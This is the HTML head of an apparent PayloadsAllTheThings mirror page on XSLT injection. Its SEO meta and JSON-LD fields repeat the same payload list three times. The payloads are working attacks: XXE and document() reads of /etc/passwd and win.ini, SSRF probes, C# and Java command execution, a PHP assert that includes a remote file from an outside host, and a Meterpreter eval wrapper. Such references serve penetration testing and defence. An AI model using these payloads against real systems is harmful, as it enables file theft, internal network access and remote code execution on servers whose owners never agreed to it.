<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="XSLT Injection" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="XSLT Injection Processing an unvalidated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code Summary Tools Exploit Determine the vendor and version External Entity Read files and SSRF using document Remote Code Execution with Embedded Script Blocks Remote Code Execution with PHP wrapper Remote Code Execution with Java Remote Code Execution with Native .NET References Tools Exploit Determine the vendor and version 1 2 3 4 5 6 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt; &lt;xsl:template match=&quot;/fruits&quot;&gt; &lt;xsl:value-of select=&quot;system-property(&#39;xsl:vendor&#39;)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 1 2 3 4 5 6 7 8 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt; &lt;body&gt; &lt;br /&gt;Version: &lt;xsl:value-of select=&quot;system-property(&#39;xsl:version&#39;)&quot; /&gt; &lt;br /&gt;Vendor: &lt;xsl:value-of select=&quot;system-property(&#39;xsl:vendor&#39;)&quot; /&gt; &lt;br /&gt;Vendor URL: &lt;xsl:value-of select=&quot;system-property(&#39;xsl:vendor-url&#39;)&quot; /&gt; &lt;/body&gt; &lt;/html&gt; External Entity 1 2 3 4 5 6 7 8 9 10 11 12 13 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM &quot;C:\secretfruit.txt&quot;&gt;]&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt; &lt;xsl:template match=&quot;/fruits&quot;&gt; Fruits &amp;ext_file;: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select=&quot;fruit&quot;&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select=&quot;name&quot;/&gt;: &lt;xsl:value-of select=&quot;description&quot;/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Read files and SSRF using document 1 2 3 4 5 6 7 8 9 10 11 12 13 14 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt; &lt;xsl:template match=&quot;/fruits&quot;&gt; &lt;xsl:copy-of select=&quot;document(&#39;http://172.16.132.1:25&#39;)&quot;/&gt; &lt;xsl:copy-of select=&quot;document(&#39;/etc/passwd&#39;)&quot;/&gt; &lt;xsl:copy-of select=&quot;document(&#39;file:///c:/winnt/win.ini&#39;)&quot;/&gt; Fruits: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select=&quot;fruit&quot;&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select=&quot;name&quot;/&gt;: &lt;xsl:value-of select=&quot;description&quot;/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Remote Code Execution with Embedded Script Blocks 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:user=&quot;urn:my-scripts&quot;&gt; &lt;msxsl:script language = &quot;C#&quot; implements-prefix = &quot;user&quot;&gt; &lt;![CDATA[ public string execute(){ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName= &quot;C:\\windows\\system32\\cmd.exe&quot;; proc.StartInfo.RedirectStandardOutput = true; proc.StartInfo.UseShellExecute = false; proc.StartInfo.Arguments = &quot;/c dir&quot;; proc.Start(); proc.WaitForExit(); return proc.StandardOutput.ReadToEnd(); } ]]&gt; &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;/fruits&quot;&gt; --- BEGIN COMMAND OUTPUT --- &lt;xsl:value-of select=&quot;user:execute()&quot;/&gt; --- END COMMAND OUTPUT --- &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Remote Code Execution with PHP wrapper Execute the function readfile. 1 2 3 4 5 6 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt; &lt;body&gt; &lt;xsl:value-of select=&quot;php:function(&#39;readfile&#39;,&#39;index.php&#39;)&quot; /&gt; &lt;/body&gt; &lt;/html&gt; Execute the function scandir. 1 2 3 4 5 &lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot; version=&quot;1.0&quot;&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of name=&quot;assert&quot; select=&quot;php:function(&#39;scandir&#39;, &#39;.&#39;)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Execute a remote php file using assert 1 2 3 4 5 6 7 8 9 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt; &lt;body style=&quot;font-family:Arial;font-size:12pt;background-color:#EEEEEE&quot;&gt; &lt;xsl:variable name=&quot;payload&quot;&gt; include(&quot;http://10.10.10.10/test.php&quot;) &lt;/xsl:variable&gt; &lt;xsl:variable name=&quot;include&quot; select=&quot;php:function(&#39;assert&#39;,$payload)&quot;/&gt; &lt;/body&gt; &lt;/html&gt; Execute a PHP meterpreter using PHP wrapper. 1 2 3 4 5 6 7 8 &lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot; version=&quot;1.0&quot;&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:variable name=&quot;eval&quot;&gt; eval(base64_decode(&#39;Base64-encoded Meterpreter code&#39;)) &lt;/xsl:variable&gt; &lt;xsl:variable name=&quot;preg&quot; select=&quot;php:function(&#39;preg_replace&#39;, &#39;/.*/e&#39;, $eval, &#39;&#39;)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Remote Code Execution with Java 1 2 3 4 5 6 7 8 &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot; xmlns:ob=&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:variable name=&quot;rtobject&quot; select=&quot;rt:getRuntime()&quot;/&gt; &lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtobject,&#39;ls&#39;)&quot;/&gt; &lt;xsl:variable name=&quot;processString&quot; select=&quot;ob:toString($process)&quot;/&gt; &lt;xsl:value-of select=&quot;$processString&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 1 2 3 4 5 6 &lt;xml version=&quot;1.0&quot;?&gt; &lt;xsl:stylesheet version=&quot;2.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:java=&quot;http://saxon.sf.net/java-type&quot;&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;Runtime:exec(Runtime:getRuntime(),&#39;cmd.exe /C ping IP&#39;)&quot; xmlns:Runtime=&quot;java:java.lang.Runtime&quot;/&gt; &lt;/xsl:template&gt;. &lt;/xsl:stylesheet&gt; Remote Code Execution with Native .NET 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:App=&quot;http://www.tempuri.org/App&quot;&gt; &lt;msxsl:script implements-prefix=&quot;App&quot; language=&quot;C#&quot;&gt; &lt;![CDATA[ public string ToShortDateString(string date) { System.Diagnostics.Process.Start(&quot;cmd.exe&quot;); return &quot;01/01/2001&quot;; } ]]&gt; &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;ArrayOfTest&quot;&gt; &lt;TABLE&gt; &lt;xsl:for-each select=&quot;Test&quot;&gt; &lt;TR&gt; &lt;TD&gt; &lt;xsl:value-of select=&quot;App:ToShortDateString(TestDate)&quot; /&gt; &lt;/TD&gt; &lt;/TR&gt; &lt;/xsl:for-each&gt; &lt;/TABLE&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; References From XSLT code execution to Meterpreter shells - 02 July 2012 - @agarri XSLT Injection - Fortify XSLT Injection Basics - Saxon" />
<meta property="og:description" content="XSLT Injection Processing an unvalidated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code Summary Tools Exploit Determine the vendor and version External Entity Read files and SSRF using document Remote Code Execution with Embedded Script Blocks Remote Code Execution with PHP wrapper Remote Code Execution with Java Remote Code Execution with Native .NET References Tools Exploit Determine the vendor and version 1 2 3 4 5 6 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt; &lt;xsl:template match=&quot;/fruits&quot;&gt; &lt;xsl:value-of select=&quot;system-property(&#39;xsl:vendor&#39;)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 1 2 3 4 5 6 7 8 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt; &lt;body&gt; &lt;br /&gt;Version: &lt;xsl:value-of select=&quot;system-property(&#39;xsl:version&#39;)&quot; /&gt; &lt;br /&gt;Vendor: &lt;xsl:value-of select=&quot;system-property(&#39;xsl:vendor&#39;)&quot; /&gt; &lt;br /&gt;Vendor URL: &lt;xsl:value-of select=&quot;system-property(&#39;xsl:vendor-url&#39;)&quot; /&gt; &lt;/body&gt; &lt;/html&gt; External Entity 1 2 3 4 5 6 7 8 9 10 11 12 13 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM &quot;C:\secretfruit.txt&quot;&gt;]&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt; &lt;xsl:template match=&quot;/fruits&quot;&gt; Fruits &amp;ext_file;: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select=&quot;fruit&quot;&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select=&quot;name&quot;/&gt;: &lt;xsl:value-of select=&quot;description&quot;/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Read files and SSRF using document 1 2 3 4 5 6 7 8 9 10 11 12 13 14 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt; &lt;xsl:template match=&quot;/fruits&quot;&gt; &lt;xsl:copy-of select=&quot;document(&#39;http://172.16.132.1:25&#39;)&quot;/&gt; &lt;xsl:copy-of select=&quot;document(&#39;/etc/passwd&#39;)&quot;/&gt; &lt;xsl:copy-of select=&quot;document(&#39;file:///c:/winnt/win.ini&#39;)&quot;/&gt; Fruits: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select=&quot;fruit&quot;&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select=&quot;name&quot;/&gt;: &lt;xsl:value-of select=&quot;description&quot;/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Remote Code Execution with Embedded Script Blocks 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:user=&quot;urn:my-scripts&quot;&gt; &lt;msxsl:script language = &quot;C#&quot; implements-prefix = &quot;user&quot;&gt; &lt;![CDATA[ public string execute(){ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName= &quot;C:\\windows\\system32\\cmd.exe&quot;; proc.StartInfo.RedirectStandardOutput = true; proc.StartInfo.UseShellExecute = false; proc.StartInfo.Arguments = &quot;/c dir&quot;; proc.Start(); proc.WaitForExit(); return proc.StandardOutput.ReadToEnd(); } ]]&gt; &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;/fruits&quot;&gt; --- BEGIN COMMAND OUTPUT --- &lt;xsl:value-of select=&quot;user:execute()&quot;/&gt; --- END COMMAND OUTPUT --- &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Remote Code Execution with PHP wrapper Execute the function readfile. 1 2 3 4 5 6 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt; &lt;body&gt; &lt;xsl:value-of select=&quot;php:function(&#39;readfile&#39;,&#39;index.php&#39;)&quot; /&gt; &lt;/body&gt; &lt;/html&gt; Execute the function scandir. 1 2 3 4 5 &lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot; version=&quot;1.0&quot;&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of name=&quot;assert&quot; select=&quot;php:function(&#39;scandir&#39;, &#39;.&#39;)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Execute a remote php file using assert 1 2 3 4 5 6 7 8 9 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt; &lt;body style=&quot;font-family:Arial;font-size:12pt;background-color:#EEEEEE&quot;&gt; &lt;xsl:variable name=&quot;payload&quot;&gt; include(&quot;http://10.10.10.10/test.php&quot;) &lt;/xsl:variable&gt; &lt;xsl:variable name=&quot;include&quot; select=&quot;php:function(&#39;assert&#39;,$payload)&quot;/&gt; &lt;/body&gt; &lt;/html&gt; Execute a PHP meterpreter using PHP wrapper. 1 2 3 4 5 6 7 8 &lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot; version=&quot;1.0&quot;&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:variable name=&quot;eval&quot;&gt; eval(base64_decode(&#39;Base64-encoded Meterpreter code&#39;)) &lt;/xsl:variable&gt; &lt;xsl:variable name=&quot;preg&quot; select=&quot;php:function(&#39;preg_replace&#39;, &#39;/.*/e&#39;, $eval, &#39;&#39;)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Remote Code Execution with Java 1 2 3 4 5 6 7 8 &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot; xmlns:ob=&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:variable name=&quot;rtobject&quot; select=&quot;rt:getRuntime()&quot;/&gt; &lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtobject,&#39;ls&#39;)&quot;/&gt; &lt;xsl:variable name=&quot;processString&quot; select=&quot;ob:toString($process)&quot;/&gt; &lt;xsl:value-of select=&quot;$processString&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 1 2 3 4 5 6 &lt;xml version=&quot;1.0&quot;?&gt; &lt;xsl:stylesheet version=&quot;2.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:java=&quot;http://saxon.sf.net/java-type&quot;&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;Runtime:exec(Runtime:getRuntime(),&#39;cmd.exe /C ping IP&#39;)&quot; xmlns:Runtime=&quot;java:java.lang.Runtime&quot;/&gt; &lt;/xsl:template&gt;. &lt;/xsl:stylesheet&gt; Remote Code Execution with Native .NET 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:App=&quot;http://www.tempuri.org/App&quot;&gt; &lt;msxsl:script implements-prefix=&quot;App&quot; language=&quot;C#&quot;&gt; &lt;![CDATA[ public string ToShortDateString(string date) { System.Diagnostics.Process.Start(&quot;cmd.exe&quot;); return &quot;01/01/2001&quot;; } ]]&gt; &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;ArrayOfTest&quot;&gt; &lt;TABLE&gt; &lt;xsl:for-each select=&quot;Test&quot;&gt; &lt;TR&gt; &lt;TD&gt; &lt;xsl:value-of select=&quot;App:ToShortDateString(TestDate)&quot; /&gt; &lt;/TD&gt; &lt;/TR&gt; &lt;/xsl:for-each&gt; &lt;/TABLE&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; References From XSLT code execution to Meterpreter shells - 02 July 2012 - @agarri XSLT Injection - Fortify XSLT Injection Basics - Saxon" />
<link rel="canonical" href="http://localhost:4000/XSLT-Injection/" />
<meta property="og:url" content="http://localhost:4000/XSLT-Injection/" />
<meta property="og:site_name" content="PayloadsAllTheThings" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-12-26T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="XSLT Injection" />
<meta name="twitter:site" content="@Zxce3_" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"XSLT Injection","dateModified":"2019-12-26T00:00:00+07:00","datePublished":"2019-12-26T00:00:00+07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/XSLT-Injection/"},"url":"http://localhost:4000/XSLT-Injection/","description":"XSLT Injection Processing an unvalidated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code Summary Tools Exploit Determine the vendor and version External Entity Read files and SSRF using document Remote Code Execution with Embedded Script Blocks Remote Code Execution with PHP wrapper Remote Code Execution with Java Remote Code Execution with Native .NET References Tools Exploit Determine the vendor and version 1 2 3 4 5 6 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt; &lt;xsl:template match=&quot;/fruits&quot;&gt; &lt;xsl:value-of select=&quot;system-property(&#39;xsl:vendor&#39;)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 1 2 3 4 5 6 7 8 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt; &lt;body&gt; &lt;br /&gt;Version: &lt;xsl:value-of select=&quot;system-property(&#39;xsl:version&#39;)&quot; /&gt; &lt;br /&gt;Vendor: &lt;xsl:value-of select=&quot;system-property(&#39;xsl:vendor&#39;)&quot; /&gt; &lt;br /&gt;Vendor URL: &lt;xsl:value-of select=&quot;system-property(&#39;xsl:vendor-url&#39;)&quot; /&gt; &lt;/body&gt; &lt;/html&gt; External Entity 1 2 3 4 5 6 7 8 9 10 11 12 13 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM &quot;C:\\secretfruit.txt&quot;&gt;]&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt; &lt;xsl:template match=&quot;/fruits&quot;&gt; Fruits &amp;ext_file;: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select=&quot;fruit&quot;&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select=&quot;name&quot;/&gt;: &lt;xsl:value-of select=&quot;description&quot;/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Read files and SSRF using document 1 2 3 4 5 6 7 8 9 10 11 12 13 14 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt; &lt;xsl:template match=&quot;/fruits&quot;&gt; &lt;xsl:copy-of select=&quot;document(&#39;http://172.16.132.1:25&#39;)&quot;/&gt; &lt;xsl:copy-of select=&quot;document(&#39;/etc/passwd&#39;)&quot;/&gt; &lt;xsl:copy-of select=&quot;document(&#39;file:///c:/winnt/win.ini&#39;)&quot;/&gt; Fruits: &lt;!-- Loop for each fruit --&gt; &lt;xsl:for-each select=&quot;fruit&quot;&gt; &lt;!-- Print name: description --&gt; - &lt;xsl:value-of select=&quot;name&quot;/&gt;: &lt;xsl:value-of select=&quot;description&quot;/&gt; &lt;/xsl:for-each&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Remote Code Execution with Embedded Script Blocks 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:user=&quot;urn:my-scripts&quot;&gt; &lt;msxsl:script language = &quot;C#&quot; implements-prefix = &quot;user&quot;&gt; &lt;![CDATA[ public string execute(){ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName= &quot;C:\\\\windows\\\\system32\\\\cmd.exe&quot;; proc.StartInfo.RedirectStandardOutput = true; proc.StartInfo.UseShellExecute = false; proc.StartInfo.Arguments = &quot;/c dir&quot;; proc.Start(); proc.WaitForExit(); return proc.StandardOutput.ReadToEnd(); } ]]&gt; &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;/fruits&quot;&gt; --- BEGIN COMMAND OUTPUT --- &lt;xsl:value-of select=&quot;user:execute()&quot;/&gt; --- END COMMAND OUTPUT --- &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Remote Code Execution with PHP wrapper Execute the function readfile. 1 2 3 4 5 6 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt; &lt;body&gt; &lt;xsl:value-of select=&quot;php:function(&#39;readfile&#39;,&#39;index.php&#39;)&quot; /&gt; &lt;/body&gt; &lt;/html&gt; Execute the function scandir. 1 2 3 4 5 &lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot; version=&quot;1.0&quot;&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of name=&quot;assert&quot; select=&quot;php:function(&#39;scandir&#39;, &#39;.&#39;)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Execute a remote php file using assert 1 2 3 4 5 6 7 8 9 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt; &lt;body style=&quot;font-family:Arial;font-size:12pt;background-color:#EEEEEE&quot;&gt; &lt;xsl:variable name=&quot;payload&quot;&gt; include(&quot;http://10.10.10.10/test.php&quot;) &lt;/xsl:variable&gt; &lt;xsl:variable name=&quot;include&quot; select=&quot;php:function(&#39;assert&#39;,$payload)&quot;/&gt; &lt;/body&gt; &lt;/html&gt; Execute a PHP meterpreter using PHP wrapper. 1 2 3 4 5 6 7 8 &lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot; version=&quot;1.0&quot;&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:variable name=&quot;eval&quot;&gt; eval(base64_decode(&#39;Base64-encoded Meterpreter code&#39;)) &lt;/xsl:variable&gt; &lt;xsl:variable name=&quot;preg&quot; select=&quot;php:function(&#39;preg_replace&#39;, &#39;/.*/e&#39;, $eval, &#39;&#39;)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; Remote Code Execution with Java 1 2 3 4 5 6 7 8 &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot; xmlns:ob=&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:variable name=&quot;rtobject&quot; select=&quot;rt:getRuntime()&quot;/&gt; &lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtobject,&#39;ls&#39;)&quot;/&gt; &lt;xsl:variable name=&quot;processString&quot; select=&quot;ob:toString($process)&quot;/&gt; &lt;xsl:value-of select=&quot;$processString&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; 1 2 3 4 5 6 &lt;xml version=&quot;1.0&quot;?&gt; &lt;xsl:stylesheet version=&quot;2.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:java=&quot;http://saxon.sf.net/java-type&quot;&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;Runtime:exec(Runtime:getRuntime(),&#39;cmd.exe /C ping IP&#39;)&quot; xmlns:Runtime=&quot;java:java.lang.Runtime&quot;/&gt; &lt;/xsl:template&gt;. &lt;/xsl:stylesheet&gt; Remote Code Execution with Native .NET 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:App=&quot;http://www.tempuri.org/App&quot;&gt; &lt;msxsl:script implements-prefix=&quot;App&quot; language=&quot;C#&quot;&gt; &lt;![CDATA[ public string ToShortDateString(string date) { System.Diagnostics.Process.Start(&quot;cmd.exe&quot;); return &quot;01/01/2001&quot;; } ]]&gt; &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;ArrayOfTest&quot;&gt; &lt;TABLE&gt; &lt;xsl:for-each select=&quot;Test&quot;&gt; &lt;TR&gt; &lt;TD&gt; &lt;xsl:value-of select=&quot;App:ToShortDateString(TestDate)&quot; /&gt; &lt;/TD&gt; &lt;/TR&gt; &lt;/xsl:for-each&gt; &lt;/TABLE&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; References From XSLT code execution to Meterpreter shells - 02 July 2012 - @agarri XSLT Injection - Fortify XSLT Injection Basics - Saxon","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>XSLT Injection | PayloadsAllTheThings
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



